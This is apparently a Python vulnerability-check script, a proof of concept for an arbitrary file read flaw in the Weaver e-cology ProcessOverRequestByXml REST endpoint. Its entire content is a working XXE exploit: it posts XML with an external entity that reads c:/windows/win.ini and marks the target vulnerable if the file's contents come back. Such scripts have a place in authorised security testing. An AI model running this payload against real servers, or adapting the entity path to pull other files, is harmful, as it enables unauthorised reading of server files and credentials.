import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-cology-ProcessOverRequestByXml接口存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Type': 'application/xml',
        'Content-Length': '146'
    }
    data = '''<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>'''
    vurl = urllib.parse.urljoin(url, "/rest/ofs/ProcessOverRequestByXml")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and '[files]' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult